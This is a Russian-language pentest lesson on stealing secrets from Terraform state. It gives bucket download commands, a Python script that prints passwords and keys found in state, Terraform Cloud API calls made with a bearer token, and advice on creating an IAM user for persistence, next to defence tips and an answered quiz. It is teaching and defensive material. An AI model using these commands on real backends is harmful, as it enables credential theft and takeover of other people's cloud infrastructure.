---
id: cloud-terraform-state
title: "Terraform state и backend: секреты, доступ и подмена"
category: cloud
parent: cloud-iac-deep
difficulty: hard
order: 1
tags: [cloud, terraform, state, backend, iac, secrets, s3, gcs]
prerequisites: [cloud-iac-deep, cloud-terraform]
useful_for:
  - "Пентест Infrastructure as Code"
  - "Кража секретов из Terraform state"
  - "Атаки на backend"
estimated_minutes: 45
summary: "Terraform state: где лежит, что содержит, как читать и подменять. Backend S3/GCS/Azure, шифрование, блокировки и извлечение секретов через terraform show/state pull."
---

## Зачем этот урок

Terraform state — это файл, в котором Terraform хранит соответствие между ресурсами и их атрибутами. Критично: **state содержит все атрибуты, включая пароли, ключи и токены**, часто в открытом виде. Backend (где лежит state) — S3/GCS/Azure Blob/Terraform Cloud. Если у вас есть доступ к backend, вы получаете и секреты, и возможность подменить инфраструктуру. Terraform — де-факто стандарт IaC, поэтому это одна из самых «доходных» целей в облачном пентесте.

## Модель Terraform state

- **state** (`terraform.tfstate`) — JSON с ресурсами и их атрибутами.
- **backend** — место хранения state (local, S3, GCS, AzureRM, Consul, Terraform Cloud).
- **state locking** — DynamoDB (S3 backend), чтобы избежать одновременных изменений.
- **encryption** — S3 SSE, GCS CMEK, Azure SSE.
- **sensitive values** — Terraform помечает их как sensitive, но в state они **хранятся в открытом виде**.
- **modules/providers** — код и версии; provider-креды из переменных среды.
- **workspaces** — несколько state в одном backend.

## Инструменты и команды

```bash
# Если есть доступ к репозиторию и backend
terraform init
terraform state list
terraform show                     # все ресурсы и атрибуты
terraform show -json | jq '.values.root_module.resources[] | {type:.type, values:.values}'
terraform state pull > state.json  # выгрузить state
terraform output -json             # outputs (часто секреты)

# Backend S3: читаем напрямую
aws s3 ls s3://company-tfstate/
aws s3 cp s3://company-tfstate/prod/terraform.tfstate state.json
jq '.. | objects | select(has("password") or has("secret") or has("key"))' state.json

# Backend GCS
gsutil cp gs://company-tfstate/prod/default.tfstate state.json

# Backend Azure
az storage blob download --account-name tfstate --container-name prod --name terraform.tfstate -f state.json
```

## Разобранный пример: state → секреты

Сценарий: бакет `company-tfstate` доступен (через IAM или публично).

```bash
aws s3 ls s3://company-tfstate/ --recursive | head
# prod/terraform.tfstate
# prod/terraform.tfstate.backup

aws s3 cp s3://company-tfstate/prod/terraform.tfstate /tmp/state.json
python3 - <<'PY'
import json
d = json.load(open('/tmp/state.json'))
def walk(o, path=''):
    if isinstance(o, dict):
        for k, v in o.items(): walk(v, f'{path}.{k}')
    elif isinstance(o, list):
        for i, v in enumerate(o): walk(v, f'{path}[{i}]')
    else:
        if any(s in path.lower() for s in ('password','secret','key','token','pass')):
            print(path, '=', o)
walk(d)
PY
# .root_module.resources[3].values.admin_password = S3cr3t-Pr0d
# .root_module.resources[7].values.db_password = pg-pass-123
# .root_module.resources[9].values.access_key = AKIA...
```

За один `s3 cp` получили пароли БД, admin-пароли и AWS-ключи. Если бакет был публичным или доступен широкой роли — секреты могли утечь давно.

## Что содержит state

| Ресурс | Что в state |
|---|---|
| `aws_db_instance` | `password`, `username` |
| `aws_iam_access_key` | `secret` (секретный ключ!) |
| `aws_secretsmanager_secret_version` | `secret_string` |
| `azurerm_key_vault_secret` | `value` |
| `google_secret_manager_secret_version` | `secret_data` |
| `tls_private_key` | `private_key_pem` |
| `random_password` | `result` |
| `kubernetes_secret` | `data` |

Практически любой секрет, созданный Terraform, лежит в state.

## Подмена инфраструктуры

Если у вас есть **запись** в backend (или права применить план), вы можете подменить state или применить свои изменения. Подмена state позволяет Terraform «увидеть» ресурс подконтрольным или удалить/создать ресурс. Но будьте осторожны: `terraform apply` — разрушительная операция, может удалить прод-ресурсы. Для пентеста достаточно чтения; для персистентности — добавление своего ресурса через apply (например, IAM-пользователя).

```bash
# Осторожно: apply может изменить/удалить ресурсы
terraform plan    # сначала посмотреть, что изменится
```

## Чек-лист атаки

1. Найти backend (по конфигам, `.terraform/`, CI-переменным).
2. Проверить доступ к бакету/контейнеру с state.
3. Скачать state и искать секреты.
4. Проверить `.terraform.tfstate.backup` (часто забыт).
5. Проверить outputs (могут содержать секреты).
6. Проверить права на запись в backend (подмена).
7. Проверить Terraform Cloud/Enterprise (workspaces, переменные).

## Обход защит и edge cases

- **Encryption.** S3 SSE/CMEK шифрует state, но если у вас есть права чтения через AWS/GCP/Azure, расшифровка происходит прозрачно. Шифрование не защищает от кражи, только от физического доступа.
- **State locking.** DynamoDB-блокировка мешает параллельным изменениям, но не чтению.
- **Backend credentials.** Terraform использует креды из окружения/CI; их утечка = доступ к backend.
- **Terraform Cloud.** State в TFC; доступ через API-токен. Переменные workspace могут быть sensitive.
- **Sensitive flag.** Не влияет на хранение — только на вывод в CLI.

## Частые ошибки и подводные камни

- Считать, что «state в приватном бакете» = безопасно: проверяйте IAM бакета.
- Не скачать `.backup` — там может быть старая версия с другими секретами.
- Игнорировать outputs.
- Забыть про Terraform Cloud как отдельную цель.
- Применять `terraform apply` без `plan` — риск разрушить прод.

## Защита и детект

- Шифровать state (SSE-KMS/CMEK) и ограничивать доступ к бакету строгим IAM.
- Не хранить секреты в state: использовать `data` из Secret Manager или `ephemeral`-ресурсы (Terraform 1.6+).
- Ограничить `terraform apply` и доступ к backend.
- Включить версионирование бакета state и аудит доступа.
- Использовать Terraform Cloud с RBAC и audit log.

## Модель угроз и типовые мисконфиги

Типичный мисконфиг — публичный бакет state. Второй — широкая роль с доступом к state. Третий — секреты в открытом виде в state. Четвёртый — незащищённый `.backup`. Пятый — outputs с секретами. Все ведут к краже кредов.

## Практическое задание

1. Создайте Terraform-конфиг с секретом, примените и найдите секрет в state.
2. Выгрузите state через `terraform state pull` и `show -json`.
3. Ограничьте доступ к бакету и проверьте, что чтение падает.
4. Используйте `ephemeral`-ресурс и убедитесь, что секрет не пишется в state.

## Что дальше / решение

Из state достаём ключи и пароли. Дальше — использовать их. Зафиксируйте путь «backend → state → секреты» в графе. При шифровании с недоступным ключом — `blocked`. Если есть запись в backend — рассмотрите подмену, но осторожно.

## Terraform Cloud и Enterprise

Terraform Cloud (TFC) хранит state и переменные на стороне HashiCorp. Доступ — через API-токен (user/team/org). Это отдельная цель: утечка токена = доступ к state и возможность запускать runs.

```bash
# Проверяем токен и организации
curl -s -H "Authorization: Bearer $TFC_TOKEN" https://app.terraform.io/api/v2/account/details | jq '.data.attributes.username'
curl -s -H "Authorization: Bearer $TFC_TOKEN" https://app.terraform.io/api/v2/organizations | jq -r '.data[].id'

# Workspaces и переменные
curl -s -H "Authorization: Bearer $TFC_TOKEN" \
  "https://app.terraform.io/api/v2/organizations/ORG/workspaces" | jq -r '.data[].attributes.name'

# Sensitive-переменные не показываются, но state доступен
curl -s -H "Authorization: Bearer $TFC_TOKEN" \
  "https://app.terraform.io/api/v2/workspaces/WS/current-state-version" | jq -r '.data.attributes."hosted-state-download-url"'
```

TFC часто хранит облачные креды как sensitive-переменные (для provider'ов). Если у вас есть токен с правами на workspace, вы можете запустить run с изменённым кодом — то есть применить произвольную инфраструктуру. Проверяйте права токена (`account/details`, team access) и то, к каким workspaces он даёт доступ.

## Квиз

```quiz
- question: "Почему Terraform state опасен?"
  options:
    - "Он хранит все атрибуты, включая пароли и ключи, часто в открытом виде"
    - "Он только список имён"
    - "Он всегда зашифрован"
    - "Он публичен по умолчанию"
  answer: 0
  explanation: "State сериализует атрибуты ресурсов, включая sensitive."
- question: "Что даёт terraform state pull?"
  options:
    - "Выгружает текущий state в stdout"
    - "Применяет изменения"
    - "Удаляет state"
    - "Шифрует state"
  answer: 0
  explanation: "state pull возвращает содержимое state."
- question: "Зачем проверять .terraform.tfstate.backup?"
  options:
    - "Там может быть старая версия state с другими секретами"
    - "Он зашифрован"
    - "Он пустой"
    - "Он публичен"
  answer: 0
  explanation: "Backup-файл часто забыт и содержит предыдущее состояние."
- question: "Как избежать секретов в state?"
  options:
    - "Использовать ephemeral-ресурсы и data из секрет-менеджера"
    - "Пометить sensitive"
    - "Использовать local backend"
    - "Отключить шифрование"
  answer: 0
  explanation: "Sensitive не убирает значение из state; ephemeral — не пишет."
```

## Где пригодится

- **Пентест IaC:** извлечение секретов из state.
- **Red team:** доступ к инфраструктуре через backend.
- **Blue team:** защита state и переход на ephemeral.
- **DevSecOps:** аудит IaC.
